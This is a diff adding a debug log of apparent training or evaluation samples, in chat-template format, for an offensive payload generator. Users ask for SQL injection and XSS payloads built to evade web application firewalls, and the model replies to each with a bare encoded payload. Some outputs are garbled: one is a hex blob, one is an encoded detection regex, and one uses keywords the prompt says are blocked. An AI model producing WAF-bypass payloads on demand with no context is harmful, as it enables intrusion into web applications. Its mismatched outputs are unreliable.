@@ -1,0 +1,56 @@
+[DEBUG] Sample text 0: <bos><start_of_turn>user
+Generate an advanced obfuscated payload for SQLI using Triple URL Encode (heuristic)_adv_obf.<end_of_turn>
+<start_of_turn>model
+%252527%25252520%2525257c%2525257c%252525201%2525253d1%25252523<end_of_turn>
+
+[DEBUG] Sample text 1: <bos><start_of_turn>user
+Generate a SQLI payload that bypasses WAF.
+
+IMPORTANT: Generate ONLY the payload code. Do not provide explanations.<end_of_turn>
+<start_of_turn>model
+EA91D9CB6028612936151FBBBFF867187A19D15E40BC405867CB52CAB8090040D5C3F902F48CCF48A83D41A3BF77E410B7B9990BD355331F2BDEB7DEB663B84A%25252C946DF463CC0946E7C12720D4BB8366C2C0C5E96193343B5E<end_of_turn>
+
+[DEBUG] Sample text 2: <bos><start_of_turn>user
+Generate a full bypass payload for SQLI using obf_case_random+obf_double_url_encode+obf_comment_sql_version_adv_obf_full_bypass.<end_of_turn>
+<start_of_turn>model
+1%2525252520%25252f%25252a%252521Or%25252a%25252f%25252525201%252525253D1<end_of_turn>
+
+[DEBUG] Sample text 3: <bos><start_of_turn>user
+Generate an advanced obfuscated payload for XSS using Double URL Encode XSS (heuristic)_adv_obf.<end_of_turn>
+<start_of_turn>model
+%2F%28%28%5C%25253D%29%7C%28%3D%29%29%5B%5E%5Cn%5D%2A%28%28%5C%25253C%29%7C%3C%29%5B%5E%5Cn%5D%2B%28%28%5C%25253E%29%7C%3E%29%2F<end_of_turn>
+
+[DEBUG] Sample text 4: <bos><start_of_turn>user
+Generate a payload for: Variant: mut_change_tautology<end_of_turn>
+<start_of_turn>model
+' OR (SELECT CASE WHEN (9=9) THEN CONCAT(0x3a,FLOOR(RAND(0)*2)) ELSE 0 END) = 0x3a<end_of_turn>
+
+[DEBUG] Sample text 5: <bos><start_of_turn>user
+Construct an event handler XSS (onclick, onerror, onload) to trigger code execution
+
+IMPORTANT: Generate ONLY the payload code. Do not provide explanations, ask questions, or start conversations.<end_of_turn>
+<start_of_turn>model
+<noframes onmousemove="alert(1)">test</noframes><end_of_turn>
+
+[DEBUG] Sample text 6: <bos><start_of_turn>user
+Generate a SQLI payload using obf_whitespace_url+obf_case_random+obf_double_url_encode bypass. IMPORTANT: Generate ONLY the payload code. Do not provide explanations.<end_of_turn>
+<start_of_turn>model
+1%25250COR%25250c1%253D1<end_of_turn>
+
+[DEBUG] Sample text 7: <bos><start_of_turn>user
+Generate a full bypass payload for XSS using Triple URL_full_bypass.<end_of_turn>
+<start_of_turn>model
+<EMBED ONFOCUS='ALERT(1)'>%25253cKEYGEN%252520ONFOCUS%25253dALERT%2525281%252529%252520AUTOFOCUS%25253e</EMBED><end_of_turn>
+
+[DEBUG] Sample text 8: <bos><start_of_turn>user
+Craft a time-delay SQL Injection payload for MySQL that leverages the SLEEP function to pause execution for 5 seconds when a specified condition is TRUE, ensuring the delay is triggered only if the database user has administrative privileges. Targeting a MySQL server behind a basic web application firewall. Observed WAF behavior: the following techniques/keywords appear blocked: ['OR', 'UNION', 'AND', 'SLEEP', 'BENCHMARK', 'EXTRACTVALUE', 'UPDATEXML', 'SELECT_USER', 'FROM_USERS', 'WHERE_1=1']. Constraints: Provide only the exact payload string. Do NOT include any explanations, comments, OR additional text in your response. Technique: time_based
+
+IMPORTANT: Generate ONLY the payload code. Do not provide explanations, ask questions, or start conversations.<end_of_turn>
+<start_of_turn>model
+1' OR (SELECT 1 FROM (SELECT SLEEP(5))a)='1<end_of_turn>
+
+[DEBUG] Sample text 9: <bos><start_of_turn>user
+Generate a full bypass payload for XSS using obf_double_url_encode+obf_url_encode+obf_case_random_adv_obf_full_bypass.<end_of_turn>
+<start_of_turn>model
+<marquee%20onerror='alert(1)'>%25253csVg&#47;OnLOaD%25253dalErt%2525281%252529%25253e</marquee><end_of_turn>
+
